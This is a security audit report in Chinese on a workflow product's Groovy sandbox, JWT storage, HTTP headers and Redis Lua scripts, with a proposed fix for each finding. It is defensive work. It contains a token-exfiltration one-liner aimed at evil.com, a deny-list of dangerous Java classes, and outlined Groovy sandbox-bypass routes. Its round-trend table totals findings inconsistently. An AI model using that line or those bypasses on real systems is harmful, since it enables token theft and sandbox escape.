# Deep Architecture Audit — Round 9

> 第九轮：前端安全、Groovy沙箱逃逸风险、Redis Lua脚本正确性、安全响应头
> 审计日期: 2026-05-31

## Summary

| Severity | Count | Categories |
|----------|-------|------------|
| **P0 CRITICAL** | 2 | Groovy沙箱暴露ExecutionContext给脚本、JWT存localStorage可被XSS窃取 |
| **P1 HIGH** | 4 | 零安全响应头(CSP/HSTS/X-Frame-Options)、6个Lua脚本内联不可审计、Groovy沙箱disallowedReceivers可绕过、零前端XSS防护 |
| **P2 MEDIUM** | 3 | GroovyScriptCache SHA-256碰撞风险(取前16字符)、Lua ACQUIRE脚本PEXPIREAT硬编码+60000、TriggerRouteService动态Lua脚本注入 |
| **P3 LOW** | 1 | window.open已加noopener/noreferrer（良好实践） |

---

## P0 — CRITICAL

### P0-1: Groovy 沙箱暴露 ExecutionContext 给脚本 — 沙箱逃逸路径

**文件**: `GroovyHandler.java:164`

```java
binding.setVariable("ctx", ctx);  // 完整 ExecutionContext 暴露给脚本！
```

Groovy 脚本可以通过 `ctx` 访问 ExecutionContext 的所有方法和字段：
- `ctx.putNodeOutput(nodeId, output)` — 修改其他节点的输出
- `ctx.setNodeStatus(nodeId, status)` — 篡改节点执行状态
- `ctx.getFlatContext()` — 读取所有节点的敏感数据（API调用结果、用户画像等）
- `ctx.getNodeOutputs()` — 读取所有节点输出

虽然 SecureASTCustomizer 限制了导入和接收者类型，但 `ctx` 是作为 Binding 变量注入的，不在导入白名单的检查范围内。脚本可以通过 `ctx` 的方法链访问任何 ExecutionContext 暴露的 API。

**影响**: 恶意/错误的 Groovy 脚本可以：
1. 篡改其他节点的执行结果
2. 读取所有节点的敏感输出（如 API 调用返回的 token）
3. 修改节点状态导致 DAG 执行逻辑混乱

**修复**: 
1. 不要暴露完整的 ExecutionContext，改为暴露只读视图 `GroovyContextView`（仅含 getFlatContext 的只读副本）
2. 或通过 `Collections.unmodifiableMap()` 包装所有输出

---

### P0-2: JWT Token 存储在 localStorage — XSS 即可窃取

**文件**: `frontend/src/context/AuthContext.tsx:83`

```typescript
localStorage.setItem('canvas_token', resp.token)
localStorage.setItem('canvas_user', JSON.stringify(resp))
```

JWT token 存储在 localStorage 中。localStorage 可被任何同源 JavaScript 访问，包括 XSS 攻击注入的脚本。一旦存在 XSS 漏洞（如未来引入 dangerouslySetInnerHTML 或第三方组件漏洞），攻击者可一行代码窃取 token：

```javascript
fetch('https://evil.com/steal?token=' + localStorage.getItem('canvas_token'))
```

**影响**: XSS → Token 窃取 → 账号完全接管

**修复**: 
1. 短期: 改用 httpOnly + Secure + SameSite=Strict 的 Cookie 存储 token
2. 长期: 实现短期 access token (5min) + 长期 refresh token (httpOnly cookie) 的双 token 方案

---

## P1 — HIGH

### P1-1: 零安全响应头 — 浏览器无保护

**问题**: 后端未设置任何安全响应头：

| 头 | 状态 | 影响 |
|----|------|------|
| Content-Security-Policy | ❌ | 无 CSP = XSS 可加载任意外部脚本 |
| X-Frame-Options | ❌ | 可被 iframe 嵌入 = 点击劫持 |
| X-Content-Type-Options | ❌ | MIME 嗅探可误执行 JS |
| Strict-Transport-Security | ❌ | 无 HSTS = 降级攻击 |
| X-XSS-Protection | ❌ | 旧浏览器无 XSS 过滤 |
| Referrer-Policy | ❌ | URL 中可能泄露 token |

**修复**: 在 SecurityConfig 或 WebFilter 中添加所有安全头

---

### P1-2: 6 个 Lua 脚本内联在 Java 代码中 — 不可审计、不可测试

**问题**: 6 个 Redis Lua 脚本以 Java 字符串内联形式存在：

| 文件 | 脚本 | 用途 |
|------|------|------|
| InFlightExecutionRegistry | ACQUIRE_SCRIPT | 并发槽位获取（最复杂） |
| InFlightExecutionRegistry | RELEASE_SCRIPT | 并发槽位释放 |
| TriggerPreCheckService | INCR_WITH_TTL_SCRIPT | 计数器+TTL |
| ContextPersistenceService | RESUME_LOCK_RELEASE_SCRIPT | 恢复锁释放 |
| CanvasService | PUBLISH_LOCK_RELEASE_SCRIPT | 发布锁释放 |
| TriggerRouteService | 动态脚本 | 路由锁释放 |

问题：
1. 不可审计 — Lua 逻辑混在 Java 中，DBA/运维无法独立审查
2. 不可测试 — 无法单独对 Lua 脚本做单元测试
3. 不可版本化 — Lua 脚本变更隐藏在 Java diff 中
4. TriggerRouteService 的 Lua 脚本是动态拼接的（`RedisScript.of(script, Long.class)`），存在注入风险

**修复**: 将 Lua 脚本移至 `resources/scripts/*.lua`，通过 `ClassPathResource` 加载

---

### P1-3: Groovy SecureASTCustomizer disallowedReceivers 可绕过

**文件**: `GroovyHandler.java:115-118`

```java
security.setDisallowedReceivers(List.of(
    "java.lang.Runtime", "java.lang.Process", "java.lang.ProcessBuilder",
    "java.lang.Thread", "java.lang.ClassLoader", "java.lang.Class",
    "java.lang.reflect.Method", "java.lang.reflect.Field"));
```

**问题**: `disallowedReceivers` 检查的是方法调用的接收者类型，但 Groovy 的 `SecureASTCustomizer` 有已知绕过方式：
1. **通过 `ctx` 对象链**: `ctx.getClass().getClassLoader()` — ctx 不在黑名单中
2. **通过 Groovy 元编程**: `ExpandoMetaClass`、`methodMissing`、`propertyMissing` 不受 AST 检查
3. **通过闭包和 GString**: 某些表达式形式绕过 AST 遍历

`setIndirectImportCheckEnabled(true)` 是好的，但仅检查间接导入，不检查间接方法调用。

**修复**: 
1. 移除 `ctx` 暴露（P0-1 的修复）
2. 添加 `SecureASTCustomizer.setDisallowedStatements` 限制闭包创建
3. 考虑迁移至 GraalVM JS 或 Janino（更严格的沙箱）

---

### P1-4: 零前端 XSS 防护 — 无 DOMPurify、无 CSP

**问题**: 
- 前端零 `dangerouslySetInnerHTML` 使用（好）
- 但也无任何 XSS 防护库（DOMPurify、xss、sanitize-html）
- 无 CSP 头（后端未设置）
- 画布名称、节点名称等用户输入直接渲染，如果后端返回含 HTML/JS 的字符串，React 默认转义但某些场景（tooltip、title 属性）可能不转义

**修复**: 添加 DOMPurify 用于所有用户输入渲染场景；后端添加 CSP

---

## P2 — MEDIUM

### P2-1: GroovyScriptCache SHA-256 取前 16 字符 — 碰撞风险

**文件**: `GroovyScriptCache.java:82`

```java
return HexFormat.of().formatHex(digest, 0, 8); // 16 hex chars = 64 bits
```

SHA-256 取前 8 字节（64 位）作为缓存 key。64 位的碰撞概率在 ~4 billion 个不同脚本时达到 50%（生日攻击）。虽然当前不太可能达到这个量级，但碰撞会导致：
- 不同脚本命中同一缓存 → 执行错误脚本 → 数据错误

**修复**: 取前 16 字节（128 位）或使用完整 SHA-256

---

### P2-2: Lua ACQUIRE 脚本 PEXPIREAT 硬编码 +60000 — 不灵活

**文件**: `InFlightExecutionRegistry.java` ACQUIRE_SCRIPT

```lua
redis.call('PEXPIREAT', KEYS[1], tonumber(ARGV[2]) + 60000)
```

ZSET key 的过期时间硬编码为 `expiryMs + 60000`（额外 60 秒）。如果画布执行超过 60 秒（全局超时 600s），ZSET key 会提前过期，导致并发计数丢失 → 超过并发限制。

**修复**: 将额外时间作为 ARGV 参数传入，而非硬编码

---

### P2-3: TriggerRouteService 动态 Lua 脚本 — 注入风险

**文件**: `TriggerRouteService.java:214`

```java
redis.execute(RedisScript.of(script, Long.class), List.of(lockKey), token);
```

`script` 变量是动态传入的字符串。如果 `script` 来源不可信（如配置错误、未来从 DB 读取），可能注入恶意 Lua 代码。

当前 `script` 是硬编码的锁释放脚本（安全），但模式本身是危险的。

**修复**: 使用 `static final RedisScript` 常量，禁止动态脚本

---

## P3 — LOW

### P3-1: window.open 已加 noopener/noreferrer — 良好实践

**文件**: `tagImportExcelPanel.tsx:50`

```typescript
window.open(tagImportApi.excelTemplateUrl, '_blank', 'noopener,noreferrer')
```

正确使用了 `noopener,noreferrer`，防止反向 tabnabbing。

---

## Cumulative Findings (Rounds 1-9)

| Severity | R1 | R2 | R3 | R4 | R5 | R6 | R7 | R8 | **R9** | **Total** |
|----------|----|----|----|----|----|----|----|----|----|-----------|
| P0 CRITICAL | 21 | 8 | 3 | 2 | 1 | 0 | 5 | 3 | **2** | **45** |
| P1 HIGH | 39 | 12 | 6 | 5 | 5 | 3 | 8 | 5 | **4** | **87** |
| P2 MEDIUM | — | 9 | 5 | 4 | 5 | 5 | 6 | 4 | **3** | **41** |
| P3 LOW | — | 4 | 2 | 1 | 2 | 2 | 3 | 1 | **1** | **16** |

### 新发现趋势

| 轮次 | P0 | P1 | 总新发现 | 变化 |
|------|----|----|---------|------|
| R1 | 21 | 39 | 60 | 基线 |
| R2 | 8 | 12 | 20 | -67% |
| R3 | 3 | 6 | 9 | -55% |
| R4 | 2 | 5 | 7 | -22% |
| R5 | 1 | 5 | 6 | -14% |
| R6 | 0 | 3 | 3 | -50% |
| R7 | 5 | 8 | 13 | +333% |
| R8 | 3 | 5 | 13 | 0% |
| R9 | 2 | 4 | 10 | -23% |

**R9 新发现降至 10 项**，呈下降趋势。本轮聚焦安全维度（Groovy 沙箱、前端 XSS、安全头、Lua 脚本），发现了 2 个 P0：Groovy 沙箱逃逸路径（ctx 暴露）和 JWT 存 localStorage。

**建议继续 R10**，聚焦：依赖漏洞扫描（CVE）、配置加密（Jasypt/Vault）、密钥轮换策略、日志脱敏验证。预计 R10 新发现将进一步减少，可能达到收敛点。
